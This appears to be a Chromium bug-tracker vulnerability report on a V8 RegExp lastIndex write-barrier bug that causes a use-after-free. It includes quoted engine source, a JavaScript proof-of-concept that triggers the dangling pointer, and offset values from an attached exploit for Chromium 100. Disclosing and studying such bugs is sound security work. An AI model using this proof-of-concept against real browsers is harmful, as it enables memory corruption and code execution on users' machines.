## Description

**VULNERABILITY DETAILS**

When `re[Symbol.replace]` is called on RegExp objects that are no longer in fast mode or with modified initial RegExp objects, v8 will call into `Runtime::kRegExpReplaceRT` [1].

If the RegExp is global, it will eventually reach this loop [2] which calls into `RegExpUtils::SetAdvancedStringIndex`. This function will call `RegExpUtils::AdvanceStringIndex` which will increment last\_index and then pass the regexp object and the new last\_index to `SetLastIndex`[3].

```
MaybeHandle<Object> RegExpUtils::SetLastIndex(Isolate\* isolate,  
                                              Handle<JSReceiver> recv,  
                                              uint64_t value) {  
  Handle<Object> value_as_object =  
      isolate->factory()->NewNumberFromInt64(value); /*** A ***/
  if (HasInitialRegExpMap(isolate, \*recv)) { /*** B ***/  
    JSRegExp::cast(\*recv).set_last_index(\*value_as_object, SKIP_WRITE_BARRIER); /*** C ***/
    return recv;  
  } else {  
    return Object::SetProperty(  
        isolate, recv, isolate->factory()->lastIndex_string(), value_as_object,  
        StoreOrigin::kMaybeKeyed, Just(kThrowOnError));  
  }  
}

```

`NewNumberFromInt64` will convert the current `last_index` to an integer or a HeapNumber in NewNumberFromInt64 [A]. Then either the fast branch [B] which calls `set_last_index` directly will be called or the slow branch which calls into runtime with Object::SetProperty. If the fast branch is taken, then the `last_index` will be stored to the regexp object using `SKIP_WRITE_BARRIER` [C]

If no prior write barriers were stored for the last\_index slot, this essentially means that if we can store a non-smi value to `last_index` it will result in a use-after-free(gc?).

Putting it all together, we can store the maximum smi, 1073741823, to the `last_index`, `AdvancedStringIndex` will increment it to `1073741824`, then `NewNumberFromInt64` will convert it into a `HeapNumber` in NewSpace, and finally `JSRegExp::cast(\*recv).set_last_index` will store it to the regexp object without any write barriers. If the regexp object is in old-space, the HeapNumber allocated by `NewNumberFromInt64` is in NewSpace, and a minor GC happens this leads to `last_index` being a dangling pointer and pointing to arbitrary objects in NewSpace.

**VERSION**  

Tested on d8 9.9.115 (stable), introduced sometime in 2018  

head 10.2.0 (a15e2b579f39f6cc75394672149ebcb467e03bcf)

**REPRODUCTION CASE**

```
var re = new RegExp('foo', 'g');  
  
var match_object = {};  
match_object[0] = {  
    toString : function() {  
        return "";  
    }  
};  
  
re.exec = function() {  
    gc(); // move `re` to oldspace using a mark-sweep gc  
    delete re.exec; // transition back to initial regexp map to pass HasInitialRegExpMap  
    re.lastIndex = 1073741823; // maximum smi, adding one will result in a HeapNumber  
    RegExp.prototype.exec = function() {  
        throw ''; // break out of Regexp.replace  
    }  
    return match_object;  
};  
  
try {  
    var newstr = re[Symbol.replace]("fooooo", ".$");  
} catch(e) {}  
  
gc({type:'minor'});  
gc({type:'minor'});  
gc({type:'minor'});  
gc({type:'minor'});  
gc({type:'minor'});  
%DebugPrint(re.lastIndex);  

```

Attached is a reproduction case that does not rely on --expose-gc or --allow-natives-syntax

This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M98. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Exploit attached! The exploit requires pre-computed offsets, so running it with a local chromium build will likely fail unless you have the same build flags set that I do, but if you want to try set TARGET to "chromium" and replace the offsets with the offsets in index.html on your local build.
```
                'chromium': { // 100.0.4896.75
                    'libv8_base': 0x31a6170n,

                    'FLAG_wasm_write_protect_code_memory' :0x660cn
                },
```

Tested on Ubuntu 18 and 20, 128GB of ram and 4GB of ram respectively. Note: Exploit requires 4GB+ of ram because of the way I trigger a minor GC, however it could be easily modified for devices with less than 4GB of ram easily.
